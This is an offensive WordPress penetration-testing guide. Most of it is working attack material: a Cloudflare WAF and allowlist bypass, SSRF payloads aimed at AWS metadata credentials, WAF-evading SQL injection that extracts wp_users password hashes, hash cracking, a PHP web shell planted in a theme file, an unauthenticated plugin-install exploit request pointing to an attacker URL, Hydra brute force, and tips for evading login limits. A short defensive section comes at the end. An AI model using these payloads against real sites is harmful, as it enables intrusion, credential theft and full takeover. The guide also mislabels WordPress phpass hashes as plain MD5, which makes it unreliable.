# WordPress Penetration Testing: Complete Exploitation Methodologies


---

## Table of Contents
1. [Reconnaissance & Information Gathering](#1-reconnaissance--information-gathering)
2. [WAF Bypass via Origin IP Discovery](#2-waf-bypass-via-origin-ip-discovery)
3. [XML-RPC Exploitation (SSRF & More)](#3-xml-rpc-exploitation-ssrf--more)
4. [SQL Injection to Full Compromise](#4-sql-injection-to-full-compromise)
5. [Plugin Vulnerability Exploitation (Real 2024-2025 Campaigns)](#5-plugin-vulnerability-exploitation-real-2024-2025-campaigns)
6. [Brute Force & Credential Attacks](#6-brute-force--credential-attacks)
7. [Defensive Recommendations](#7-defensive-recommendations)

---

## 1. Reconnaissance & Information Gathering

### 1.1 Technology Stack Identification

Before any exploitation, identify what technologies the target is running.

**Using WhatWeb (Kali Linux):**
```bash
whatweb http://target.com
```

**Using Wappalyzer (Browser Extension):**
- Install from Chrome/Firefox store
- Navigate to target site
- Click extension icon to see detected CMS, frameworks, and plugins

### 1.2 WordPress-Specific Scanning with WPScan

WPScan is the industry standard WordPress vulnerability scanner .

**Basic user enumeration:**
```bash
wpscan --url http://target.com --enumerate u
```

**Deep scan with API token (more vulnerability data):**
```bash
wpscan --url http://target.com --enumerate p --api-token YOUR_API_TOKEN
```

**What this does:** The `--enumerate u` flag extracts usernames from the WordPress database via author ID enumeration (`?author=1`, `?author=2`, etc.). The `--enumerate p` flag checks installed plugins and their versions against the WPScan vulnerability database.

### 1.3 Directory Fuzzing with Gobuster

Discover hidden directories and files that may expose sensitive information .

```bash
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

**Critical files to look for:**
- `/wp-admin/` - Admin login page
- `/wp-content/uploads/` - Often allows directory listing
- `/wp-content/debug.log` - May contain sensitive errors
- `/.git/` - Source code exposure
- `/xmlrpc.php` - XML-RPC endpoint (attack surface)
- `/wp-json/wp/v2/users` - REST API user enumeration

---

## 2. WAF Bypass via Origin IP Discovery

### 2.1 The Problem

When a WordPress site uses Cloudflare, Akamai, or another CDN/WAF, your attack payloads get filtered before reaching the server. Direct SQL injection attempts return 403 Forbidden errors .

### 2.2 Finding the Origin IP: Historical DNS Records

**Real scenario from a bug bounty hunt (2024):** A tester found a SQL injection vulnerability but was blocked by Cloudflare WAF. After 8 hours of failed bypass attempts, they shifted to finding the origin IP .

**Step 1: Check historical DNS records using free tools:**

- **ViewDNS.info** - Free, no registration
- **SecurityTrails** - Free trial available
- **Censys** - Free tier for researchers

```bash
# Using SecurityTrails API
curl -s "https://api.securitytrails.com/v1/domain/target.com/history/dns" \
  -H "APIKEY: YOUR_API_KEY" | jq '.records.a'
```

**Why this works:** Before companies enable Cloudflare protection, their DNS records pointed directly to the origin server IP. Many never change this IP, or the old IP remains accessible.

### 2.3 Finding Origin IP via SSL Certificate Analysis

SSL certificates are logged in public Certificate Transparency logs, often revealing origin IPs.

```bash
# Search crt.sh for certificates
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Extract IPs from certificate subjects
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].common_name' | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```

### 2.4 Finding Origin IP via ASN Mapping

**The technique from a real bug bounty (2024):** The tester used Hurricane Electric BGP Toolkit to find all IP ranges belonging to the target organization's Autonomous System .

**Process:**

1. **Search Hurricane Electric BGP Toolkit:** https://bgp.he.net
2. **Search for the target organization name**
3. **Copy the ASN number** (e.g., `AS15169` for Google)
4. **Map IP ranges from the ASN**

```bash
# Using asnmap (install with: go install -v github.com/projectdiscovery/asnmap/cmd/asnmap@latest)
asnmap -org "Target Organization" > ranges.txt

# Scan ranges for live hosts on port 443
sudo masscan -iL ranges.txt -p443 --rate=10000 -oG live-hosts.txt
```

**Real example from the hunt:** The tester searched "Tesla Inc" in Hurricane Electric, found their ASN, then mapped all associated IP ranges. After scanning, they discovered a live host that bypassed Cloudflare entirely .

### 2.5 Finding Origin IP via Email Headers

When the WordPress site sends emails (password resets, newsletters, order confirmations), the originating server IP may be exposed in email headers.

**Process:**
1. Register an account on the target site
2. Request a password reset
3. View the full email headers in Gmail (Show Original) or Outlook (View Message Source)
4. Look for `Received` fields - search for IPs NOT in Cloudflare's range

**Cloudflare IP ranges to ignore:** [https://www.cloudflare.com/ips/](https://www.cloudflare.com/ips/)

### 2.6 Testing the Origin IP

Once you have candidate IP addresses, test them:

```bash
# Directly request the same vulnerable endpoint
curl -H "Host: target.com" http://203.0.113.45/api/videos?topic=1337%27

# Compare response with CDN-protected version
curl -H "Host: target.com" https://target.com/api/videos?topic=1337%27
```

**What to look for:**
- Origin IP returns 200 OK (vulnerable)
- CDN endpoint returns 403 Forbidden (protected)
- This confirms you've bypassed the WAF

### 2.7 Bypassing Cloudflare IP Whitelisting

Even with the origin IP, you might get a 403 Forbidden because the server only accepts connections from Cloudflare's IP range .

**Solution 1: Cloudflare Worker as Reverse Proxy**

Deploy this code to Cloudflare Workers:

```javascript
export default {
  async fetch(request, env, ctx) {
    const targetUrl = "https://YOUR_ORIGIN_IP";
    try {
      const forwardedRequest = new Request(targetUrl, {
        method: request.method,
        headers: new Headers([...request.headers].filter(([key]) => key.toLowerCase() !== "host")),
        body: request.method !== "GET" && request.method !== "HEAD" ? request.body : null,
      });
      const response = await fetch(forwardedRequest);
      return new Response(await response.text(), {
        status: response.status,
        headers: response.headers,
      });
    } catch (error) {
      return new Response("Internal Server Error", { status: 500 });
    }
  },
}
```

**Why this works:** The request originates from Cloudflare's infrastructure, so the origin server sees a Cloudflare IP and allows the connection .

**Solution 2: Add New DNS Record in Cloudflare Dashboard**
1. Log into Cloudflare dashboard
2. Add new A record pointing to the origin IP
3. Enable proxy (orange cloud icon)
4. Access via the new domain

---

## 3. XML-RPC Exploitation (SSRF & More)

### 3.1 Checking if XML-RPC is Enabled

XML-RPC is a legacy WordPress feature that allows remote operations. It's often enabled by default and forgotten .

**Test with curl:**
```bash
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName><params/></methodCall>'
```

**Expected responses:**
- `200 OK` with XML response → XML-RPC is enabled
- `405 Method Not Allowed` or `403 Forbidden` → Disabled or blocked
- `404 Not Found` → XML-RPC not accessible

### 3.2 Enumerating Available Methods

```bash
curl -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>'
```

**Dangerous methods to look for:**
- `pingback.ping` - SSRF vulnerability
- `wp.getUsersBlogs` - User enumeration
- `system.multicall` - Amplification attacks

### 3.3 SSRF via pingback.ping (Burp Suite Guide)

**Real discovery (2025):** A tester found xmlrpc.php publicly accessible, listed methods including pingback.ping, and confirmed SSRF by making the server call their Webhook.site URL .

**Step-by-step with Burp Suite:**

1. **Capture a request to the target in Burp Suite**
2. **Send to Repeater** (Ctrl+R)
3. **Change method from GET to POST**
4. **Add Content-Type header:** `Content-Type: text/xml`
5. **Replace body with the following payload:**

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>https://YOUR_SERVER</string></value>
    </param>
    <param>
      <value><string>https://target.com/VALID_POST</string></value>
    </param>
  </params>
</methodCall>
```

**For blind SSRF testing (using Burp Collaborator):**

Replace `YOUR_SERVER` with a Burp Collaborator URL:
1. Go to **Burp Menu → Burp Collaborator → Copy to clipboard**
2. Paste into the XML payload
3. Send the request
4. Click **Poll now** in Collaborator tab
5. Look for DNS or HTTP interactions 

**Real example payload:**
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://YOUR_BURP_COLLABORATOR.oastify.com</string></value>
    </param>
    <param>
      <value><string>https://target.com/2024/01/hello-world/</string></value>
    </param>
  </params>
</methodCall>
```

### 3.4 SSRF Impact & Exploitation

**What you can do with SSRF :**

**1. Port Scan Internal Services:**
```xml
<value><string>http://127.0.0.1:22</string></value>   <!-- SSH -->
<value><string>http://127.0.0.1:3306</string></value> <!-- MySQL -->
<value><string>http://127.0.0.1:5432</string></value> <!-- PostgreSQL -->
<value><string>http://127.0.0.1:6379</string></value> <!-- Redis -->
<value><string>http://127.0.0.1:9200</string></value> <!-- Elasticsearch -->
```

**2. Access Cloud Metadata (AWS):**
```xml
<value><string>http://169.254.169.254/latest/meta-data/</string></value>
<value><string>http://169.254.169.254/latest/user-data/</string></value>
<value><string>http://169.254.169.254/latest/meta-data/iam/security-credentials/</string></value>
```

**3. Access Internal Admin Panels:**
```xml
<value><string>http://192.168.1.1:8080/admin</string></value>
<value><string>http://internal-corp-site.company.local</string></value>
```

### 3.5 SSRF Limitations

**Important context from security researchers:** The pingback.ping method typically only returns boolean (true/false) or simple responses, not full HTTP response bodies. However, it can still :
- Confirm internal IP existence (port open/closed)
- Trigger DNS lookups (exfiltrating data via DNS)
- Reach internal endpoints (even without reading responses)
- Cause side effects (e.g., triggering internal API actions)

**Escalation path:** Use SSRF to find an internal service vulnerable to Log4Shell or other RCE vulnerabilities.

---

## 4. SQL Injection to Full Compromise

### 4.1 Detection Methodology

**Real case from bug bounty (2024):** A tester noticed an API call `/api/videos?topic=1337` and injected a single quote .

**Step 1: Test for injection**
```http
GET /api/videos?topic=1337' HTTP/1.1
Host: www.target.com
```
**Response:** `500 Internal Server Error` → Potential SQL injection

**Step 2: Confirm with two quotes**
```http
GET /api/videos?topic=1337'' HTTP/1.1
```
**Response:** `200 OK` → Query syntax restored

**Step 3: Boolean test**
```http
GET /api/videos?topic=1337'+AND'1'='1-- HTTP/1.1
```
**Response:** Returns data for topic 1337

```http
GET /api/videos?topic=1337'+AND'1'='2-- HTTP/1.1
```
**Response:** No data returned

**Confirmed:** Boolean-based blind SQL injection

### 4.2 WAF Bypass Techniques

**The problem:** Cloudflare WAF blocks SQL injection attempts .

**The bypass (real technique that worked):**
```http
# BLOCKED (no spaces)
/api/videos?topic=1337'+and+ascii(substring(current_database(),1,1))>32--

# WORKING (spaces added between function and parenthesis)
/api/videos?topic=1337'+and+ascii+(substring+(current_database(),1,1))>32--
```

**Why this works:** WAF rules often use regex patterns that match `function(` without spaces. Adding spaces breaks the pattern while the database still executes the function correctly .

### 4.3 Extracting Database Information (PostgreSQL Example)

**Identifying database type:**
```http
# PostgreSQL uses ||
/api/videos?topic=1337'+AND+'a'||'b'='ab'-- 

# Also check version()
/api/videos?topic=1337'+and+version() like '%PostgreSQL%'--
```

**Extracting database name character by character:**
```http
# Check length
/api/videos?topic=1337'+and+length+(current_database())=10--

# Extract first character (ASCII 102 = 'f')
/api/videos?topic=1337'+and+ascii+(substring+(current_database(),1,1))=102--

# Extract second character (ASCII 108 = 'l')
/api/videos?topic=1337'+and+ascii+(substring+(current_database(),2,1))=108--
```

**Automating with Burp Intruder:**

1. Send the request to Burp Intruder
2. Set payload position on the ASCII value
3. Use **Numbers** payload type (32-126 range)
4. Configure **Grep - Extract** to detect "Topic 1337 data returned"
5. Run attack and sort by response length

### 4.4 Extracting User Credentials (wp_users)

**WordPress database structure:**
- `wp_users` table contains `user_login` and `user_pass`
- Password hashes are MD5 (`$P$` or `$H$` format)

**Extract admin hash:**
```http
/api/videos?topic=1337'+union+select+null,user_login,user_pass,null,null+from+wp_users+where+id=1--
```

### 4.5 Cracking WordPress Hashes

```bash
# Hashcat mode 400 = WordPress MD5
hashcat -m 400 -a 0 '5f4dcc3b5aa765d61d8327deb882cf99' /usr/share/wordlists/rockyou.txt

# With rules for complexity
hashcat -m 400 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 4.6 Password Reset Without Cracking (CVE-2017-14990)

**Vulnerability:** WordPress 4.8.2 stores `wp_signups.activation_key` values in cleartext while hashing the analogous `wp_users.user_activation_key` .

**Attack chain with SQL injection:**

**Step 1: Extract activation_key from wp_signups**
```sql
SELECT activation_key FROM wp_signups WHERE user_email = 'admin@target.com'
```

**Step 2: Request password reset** (triggers key generation if not present)

**Step 3: Extract the generated key via SQL injection** (still cleartext in wp_signups)

**Step 4: Access the reset link directly**
```
https://target.com/wp-login.php?action=rp&key={ACTIVATION_KEY}&login={USERNAME}
```

**Step 5: Set new password** - No hash cracking required!

**Real impact from CVE-2017-14990:** "Remote attackers can hijack unactivated user accounts by leveraging database read access (such as access gained through an unspecified SQL injection vulnerability)" .

### 4.7 From SQLi to RCE

**Step 1: Login to wp-admin** with cracked password

**Step 2: Modify theme/plugin to execute code**

Navigate to:
```
Appearance → Theme Editor → 404.php
```

Replace content with:
```php
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
    die();
}
?>
```

**Step 3: Execute commands**
```bash
curl https://target.com/wp-content/themes/twentytwentyfour/404.php?cmd=id
```

---

## 5. Plugin Vulnerability Exploitation (Real 2024-2025 Campaigns)

### 5.1 The GutenKit & Hunk Companion Mass Exploitation

**Scale of attack (October 8-9, 2025):** Wordfence blocked 8.7 million attack attempts in 48 hours .

**Vulnerabilities exploited :**

| Plugin | Vulnerable Versions | CVE | CVSS | Description |
|--------|-------------------|-----|------|-------------|
| GutenKit | < 2.1.1 | CVE-2024-9234 | 9.8 | Unauthenticated REST endpoint allows arbitrary plugin installation |
| Hunk Companion | ≤ 1.8.4 | CVE-2024-9707 | 9.8 | Unauthenticated plugin installation via themehunk-import endpoint |
| Hunk Companion | ≤ 1.8.5 | CVE-2024-11972 | 9.8 | Same vector, variant |

**Critical fact:** Both plugins were patched nearly a year before the attack (GutenKit 2.1.1 in October 2024, Hunk Companion 1.9.0 in December 2024). Unpatched installations were the target .

### 5.2 Attack Chain Analysis

**Step 1: Scan for vulnerable plugin versions**

```bash
wpscan --url https://target.com --plugins-detection aggressive | grep -E "(gutenkit|hunk-companion)"
```

**Step 2: Exploit GutenKit (if vulnerable)**

The attacker sends a POST request to an unauthenticated REST endpoint:
```http
POST /wp-json/gutenkit/v1/install-active-plugin HTTP/1.1
Host: target.com
Content-Type: application/json

{
    "plugin_slug": "up",
    "download_url": "https://github.com/attacker/malicious-plugin/raw/main/up.zip"
}
```

**Step 3: Malicious plugin actions**

The `up.zip` contains obfuscated scripts that :
- Automatically log the attacker in as administrator
- Upload, download, and delete files
- Change file permissions
- Deploy persistent backdoors

**Step 4: Fallback if admin access fails**

If direct admin access is blocked, attackers deploy `wp-query-console` plugin (another vulnerable plugin) to achieve Remote Code Execution .

### 5.3 Indicators of Compromise (IoC)

Check your logs for these patterns :

```bash
# Check access logs for exploit attempts
grep "wp-json/gutenkit/v1/install-active-plugin" /var/log/apache2/access.log
grep "wp-json/hc/v1/themehunk-import" /var/log/apache2/access.log

# Check for malicious plugin directories
ls -la /var/www/html/wp-content/plugins/ | grep -E "(up|background-image-cropper|ultra-seo-processor-wp|oke|wp-query-console)"
```

---

## 6. Brute Force & Credential Attacks

### 6.1 User Enumeration First

Never brute force without knowing usernames. Enumerate first :

```bash
# WPScan user enumeration
wpscan --url https://target.com --enumerate u

# Manual enumeration via author ID
for i in {1..50}; do 
    curl -s -L https://target.com/?author=$i | grep -o "Author:.*" | cut -d: -f2
done

# REST API enumeration (often unauthenticated)
curl -s https://target.com/wp-json/wp/v2/users | jq '.[].slug'
```

### 6.2 Hydra Brute Force Attack

**Setup (educational lab only):** This demonstration uses Hydra against an Apache-hosted WordPress instance in a controlled environment .

**Basic Hydra command:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

**With user list:**
```bash
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

**Understanding the parameters :**
- `-l` / `-L` : Single username / Username list file
- `-P` : Password list file
- `http-post-form` : Attack type
- `F=Invalid username` : Failure string to detect failed attempts

**Results from a lab test :**
- Success rate: Over 90% against weak passwords
- Time to compromise: Under 3 minutes
- Passwords tested: ~14 million (rockyou.txt)

### 6.3 Using Burp Intruder for Brute Force

**Step 1:** Capture a login request to `/wp-login.php`

**Step 2:** Send to Intruder (Ctrl+I)

**Step 3:** Set payload positions on `log=` and `pwd=` parameters

**Step 4:** Configure payloads:
- Payload 1 (username): Simple list
- Payload 2 (password): Wordlist

**Step 5:** Configure **Grep - Extract** to detect "Invalid username" vs "The password you entered"

**Step 6:** Run attack and filter by response length

### 6.4 Bypassing Login Protection

**If "Limit Login Attempts" plugin is present:**
- Use a slow brute force (1 attempt per minute)
- Rotate IP addresses (proxy lists, VPNs)
- Target the XML-RPC `system.multicall` method which can test multiple passwords in one request

---

## 7. Defensive Recommendations

### 7.1 Immediate Actions

| Component | Action | Priority |
|-----------|--------|----------|
| GutenKit | Update to 2.1.1+ | CRITICAL |
| Hunk Companion | Update to 1.9.0+ | CRITICAL |
| XML-RPC | Block `/xmlrpc.php` in .htaccess | HIGH |
| User Enumeration | Disable REST API user endpoints | HIGH |
| WAF | Don't rely solely on WAF; patch plugins | HIGH |

### 7.2 .htaccess Rules

```apache
# Block XML-RPC completely
<Files xmlrpc.php>
    Order Deny,Allow
    Deny from all
</Files>

# Block REST API user enumeration
<Files wp-json>
    RewriteCond %{REQUEST_URI} ^/wp-json/wp/v2/users [NC]
    RewriteRule .* - [F,L]
</Files>

# Prevent directory listing
Options -Indexes
```

### 7.3 Plugin Update Commands (CLI)

```bash
# Update all plugins via WP-CLI
wp plugin update --all

# Check for vulnerable plugins
wp plugin list --status=inactive

# Install security plugin
wp plugin install wordfence --activate
```

### 7.4 Monitoring & Logging

**Check for compromise indicators:**
```bash
# Check for unexpected admin users
wp user list --role=administrator

# Check for recently modified theme/plugin files
find /var/www/html/wp-content -name "*.php" -mtime -7

# Check for suspicious outbound connections
netstat -tunap | grep ESTABLISHED
```

---

## Quick Reference: Tool Commands Summary

| Task | Command |
|------|---------|
| Scan WordPress | `wpscan --url https://target.com --enumerate u,p --api-token TOKEN` |
| Directory fuzzing | `gobuster dir -u https://target.com -w wordlist.txt` |
| Test XML-RPC | `curl -X POST https://target.com/xmlrpc.php -d '...'` |
| SSRF test (Burp) | Send XML payload with Collaborator URL |
| Find origin IP | `curl -s "https://crt.sh/?q=%25.target.com" \| jq` |
| Scan ASN ranges | `asnmap -org "Company Name" \| masscan -iL - -p443` |
| Crack hash | `hashcat -m 400 hash.txt rockyou.txt` |
| Brute force | `hydra -L users.txt -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"` |

---
